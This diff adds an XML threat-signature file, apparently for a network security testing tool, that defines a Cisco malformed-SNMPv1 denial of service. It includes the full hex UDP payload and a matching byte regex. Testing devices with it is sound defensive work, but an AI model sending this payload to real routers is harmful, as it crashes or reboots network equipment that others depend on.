@@ -1,0 +1,74 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Cisco Malformed SNMPv1 Message Denial of Service"/>
+    <EngDesc display="true" value="This threat creates a malformed SNMPv1 request which causes the Cisco device under test to reboot or require a manual reset."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="SNMP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Router"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Cisco"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="1600_Series_Router"/>
+      <item value="Cisco_IOS"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="Cisco_IOS_12.0(8)"/>
+      <item value="Cisco_IOS_11.0"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://downloads.securityfocus.com/vulnerabilities/exploits/ciscokill.c"/>
+    <CVEID display="true" value="CVE-2002-0013"/>
+    <bugtraqID display="true" value="4132"/>
+    <OSVDB display="true" value="810"/>
+    <Author display="true" value="Chuck McAuley"/>
+    <ID display="true" value="000000ff464ce51100a900fe009b00c97d3fe6cb"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="632725875759218750"/>
+    <SigStyle display="false" value="Matching"/>
+    <targetNode display="false" value="A"/>
+    <SigProtocol display="false" value="UDP"/>
+    <Rate display="false" value="1"/>
+    <Regex display="false" value="\X30\X81\Xaf\X02\X01\X00\X04\X06\X70\X75\X62\X6c\X69\X63\Xa0\X81\Xa1\X02\X02\X09\X28\X02\X01\X00\X02\X01\X00\X30\X81\X94\X30\X81\X91\X06\X81\X8c\X4d\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X25\X73\X81\Xff\Xff\Xff\Xff\Xff\Xff\Xff\Xff\X7f\X05"/>
+    <Created value="1139461923" display="false"/>
+    <ServerSideAttack display="false" value="false"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="B"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="D"/>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="Z"/>
+  </Variables>
+  <Loops>
+    <for index="A"/>
+    <for index="B"/>
+    <for index="C"/>
+    <for index="D"/>
+    <for index="E"/>
+  </Loops>
+  <Output index="A" Count="1">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="0" TotalLength="" Identification="@random(0,FFFF)" FragmentOffset="0" TTL="FF" Protocol="11" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="false" MF="false">
+        <UDP srcPort="@random(1024,65535)" destPort="$destPort" checksum="" length="" Payload="3081af02010004067075626c6963a081a10202092802010002010030819430819106818c4d73257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257325732573257381ffffffffffffffff7f0500"/>
+      </IP>
+    </Ethernet>
+  </Output>
+</threatSignature>
